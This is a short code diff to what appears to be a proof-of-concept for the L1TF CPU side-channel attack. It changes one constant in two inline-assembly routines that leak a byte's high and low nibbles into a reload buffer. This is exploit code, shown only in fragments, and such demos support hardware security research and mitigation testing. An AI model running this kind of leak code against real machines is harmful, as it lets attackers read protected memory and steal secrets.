@@ -24,7 +24,7 @@ static inline __attribute__((always_inline)) void asm_l1tf_leak_high_nibble(void
                                                                             reload_buffer_t reload_buffer) {
   __asm__ volatile("xor %%rax, %%rax\n"
                    "movl $0xB1ABE849, %%r12d\n"
-                   "movl $0xCD7E16F1, %%r13d\n"
+                   "movl $0xCD7E16F0, %%r13d\n"
                    "leaq handler%=(%%rip), %%r14\n"
                    "movq (%[leak_addr]), %%rax\n"
                    "and $0xf0, %%rax\n"
@@ -42,7 +42,7 @@ static inline __attribute__((always_inline)) void asm_l1tf_leak_low_nibble(void 
                                                                            reload_buffer_t reload_buffer) {
   __asm__ volatile("xor %%rax, %%rax\n"
                    "movl $0xB1ABE849, %%r12d\n"
-                   "movl $0xCD7E16F1, %%r13d\n"
+                   "movl $0xCD7E16F0, %%r13d\n"
                    "leaq handler%=(%%rip), %%r14\n"
                    "movq (%[leak_addr]), %%rax\n"
                    "and $0x0f, %%rax\n"
